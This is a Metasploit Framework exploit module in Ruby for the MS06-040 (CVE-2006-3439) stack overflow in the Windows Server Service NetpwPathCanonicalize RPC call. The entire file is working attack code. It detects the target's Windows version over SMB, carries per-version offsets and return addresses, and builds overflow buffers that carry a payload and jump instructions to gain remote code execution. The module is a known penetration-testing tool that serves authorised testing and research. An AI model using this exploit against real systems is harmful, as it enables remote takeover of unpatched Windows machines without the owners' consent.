##
# $Id: ms06_040_netapi.rb 11762 2011-02-17 03:56:15Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Server Service NetpwPathCanonicalize Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the NetApi32 CanonicalizePathName() function
				using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that
				other RPC calls could be used to exploit this service. This exploit will result in
				a denial of service on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt
				will likely result in a complete reboot on Windows 2000 and the termination of all
				SMB-related services on Windows XP. The default target for this exploit should succeed
				on Windows NT 4.0, Windows 2000 SP0-SP4+, Windows XP SP0-SP1 and Windows 2003 SP0.
			},
			'Author'         =>
				[
					'hdm'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11762 $',
			'References'     =>
				[
					[ 'CVE', '2006-3439' ],
					[ 'OSVDB', '27845' ],
					[ 'BID', '19409' ],
					[ 'MSB', 'MS06-040' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					# Technically we can use more space than this, but by limiting it
					# to 370 bytes we can use the same request for all Windows SPs.
					'Space'    => 370,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'DefaultTarget'  => 0,
			'Targets'        =>
				[
					[ '(wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)', { } ],
					[ '(wcscpy) Windows NT 4.0 / Windows 2000 SP0-SP4',
						{
							'Offset' => 1000,
							'Ret'    => 0x00020804
						}
					],
					[ '(wcscpy) Windows XP SP0/SP1',
						{
							'Offset' => 612,
							'Ret'    => 0x00020804
						}
					],
					[ '(stack)  Windows XP SP1 English',
						{
							'OffsetA' => 656,
							'OffsetB' => 680,
							'Ret'     => 0x71ab1d54 # jmp esp @ ws2_32.dll
						}
					],
					[ '(stack)  Windows XP SP1 Italian',
						{
							'OffsetA' => 656,
							'OffsetB' => 680,
							'Ret'     => 0x71a37bfb # jmp esp @ ws2_32.dll
						}
					],
					[ '(wcscpy) Windows 2003 SP0',
						{
							'Offset' => 612,
							'Ret'    => 0x00020804
						}
					],
				],

			'DisclosureDate' => 'Aug 8 2006'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (BROWSER, SRVSVC)", 'BROWSER']),
			], self.class)

	end

	def exploit

		connect()
		smb_login()

		mytarget = target
		if (not target) or (target.name =~ /Automatic/)
			case smb_peer_os()
				when 'Windows 5.0'
					print_status("Detected a Windows 2000 target")
					mytarget = targets[1]

				when 'Windows NT 4.0'
					print_status("Detected a Windows NT 4.0 target")
					mytarget = targets[1]

				when 'Windows 5.1'
					begin
						smb_create("\\SRVSVC")
						print_status("Detected a Windows XP SP0/SP1 target")
					rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
						if (e.error_code == 0xc0000022)
							print_status("Windows XP SP2 is not exploitable")
							return
						end
						print_status("Detected a Windows XP target (unknown patch level)")
					end
					mytarget = targets[2]

				when /Windows Server 2003 (\d+)$/
					print_status("Detected a Windows 2003 SP0 target")
					mytarget = targets[5]

				when /Windows Server 2003 (\d+) Service Pack (\d+)/
					print_status("Windows 2003 SP#{$2} is not exploitable")
					return

				when /Samba/
					print_status("Samba is not vulnerable")
					return

				else
					print_status("No target detected for #{smb_peer_os()}/#{smb_peer_lm()}...")
					return
			end
		end

		# Specific fixups for Windows NT
		case smb_peer_os()
		when 'Windows NT 4.0'
			print_status("Adjusting the SMB/DCERPC parameters for Windows NT")
			datastore['SMB::pipe_write_min_size'] = 2048
			datastore['SMB::pipe_write_max_size'] = 4096
		end

		handle = dcerpc_handle(
			'4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',
			'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
		)

		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		#
		#  /* Function 0x1f at 0x767e912c */
		#  long function_1f (
		#    [in] [unique] [string] wchar_t * arg_00,
		#    [in] [string] wchar_t * arg_01,
		#    [out] [size_is(arg_03)] char * arg_02,
		#    [in] [range(0, 64000)] long arg_03,
		#    [in] [string] wchar_t * arg_04,
		#    [in,out] long * arg_05,
		#    [in] long arg_06
		#  );
		#

		print_status("Building the stub data...")
		stub = ''

		case mytarget.name

		# This covers NT 4.0 as well
		when /wcscpy.*Windows 2000/

			code = make_nops(mytarget['Offset'] - payload.encoded.length) + payload.encoded

			path = code + ( [mytarget.ret].pack('V') * 16 ) + "\x00\x00"

			stub =
				NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString('') +
				NDR.UnicodeConformantVaryingStringPreBuilt(path) +
				NDR.long(rand(250)+1) +
				NDR.UnicodeConformantVaryingStringPreBuilt("\xeb\x02\x00\x00") +
				NDR.long(rand(250)+1) +
				NDR.long(0)

		when /wcscpy.*Windows XP/
			path =
				# Payload goes first
				payload.encoded +

				# Padding
				rand_text_alphanumeric(mytarget['Offset'] - payload.encoded.length) +

				# Land 6 bytes in to bypass garbage (XP SP0)
				[ mytarget.ret + 6 ].pack('V') +

				# Padding
				rand_text_alphanumeric(8) +

				# Address to write our shellcode (XP SP0)
				[ mytarget.ret ].pack('V') +

				# Padding
				rand_text_alphanumeric(32) +

				# Jump straight to shellcode (XP SP1)
				[ mytarget.ret ].pack('V') +

				# Padding
				rand_text_alphanumeric(8) +

				# Address to write our shellcode (XP SP1)
				[ mytarget.ret ].pack('V') +

				# Padding
				rand_text_alphanumeric(32) +

				# Terminate the path
				"\x00\x00"

			stub =
				NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString('') +
				NDR.UnicodeConformantVaryingStringPreBuilt(path) +
				NDR.long(rand(0xf0)+1) +
				NDR.UnicodeConformantVaryingString('') +
				NDR.long(rand(0xf0)+1) +
				NDR.long(0)


		when /stack/
			buff = rand_text_alphanumeric(800)
			buff[0, payload.encoded.length] = payload.encoded
			buff[ mytarget['OffsetA'], 4 ] = [mytarget.ret].pack('V')
			buff[ mytarget['OffsetB'], 5 ] = "\xe9" + [ (mytarget['OffsetA'] + 5) * -1 ].pack('V')

			path = "\\\x00\\\x00" + buff + "\x00\x00"

			stub =
				NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString('') +
				NDR.UnicodeConformantVaryingStringPreBuilt(path) +
				NDR.long(rand(0xf0)+1) +
				NDR.UnicodeConformantVaryingString('') +
				NDR.long(rand(0xf0)+1) +
				NDR.long(0)


		when /wcscpy.*Windows 2003/
			path =
				# Payload goes first
				payload.encoded +

				# Padding
				rand_text_alphanumeric(mytarget['Offset'] - payload.encoded.length) +

				# Padding
				rand_text_alphanumeric(32) +

				# The cookie is constant,
				# noticed by Nicolas Pouvesle in Misc #28
				"\x4e\xe6\x40\xbb" +

				# Padding
				rand_text_alphanumeric(4) +

				# Jump straight to shellcode
				[ mytarget.ret ].pack('V') +

				# Padding
				rand_text_alphanumeric(8) +

				# Address to write our shellcode
				[ mytarget.ret ].pack('V') +

				# Padding
				rand_text_alphanumeric(40) +

				# Terminate the path
				"\x00\x00"

			stub =
				NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString('') +
				NDR.UnicodeConformantVaryingStringPreBuilt(path) +
				NDR.long(rand(0xf0)+1) +
				NDR.UnicodeConformantVaryingString('') +
				NDR.long(rand(0xf0)+1) +
				NDR.long(0)

		end

		print_status("Calling the vulnerable function...")

		begin
			dcerpc.call(0x1f, stub, false)
			dcerpc.call(0x1f, stub, false)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
		rescue => e
			if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
				raise e
			end
		end

		# Cleanup
		handler
		disconnect
	end

end
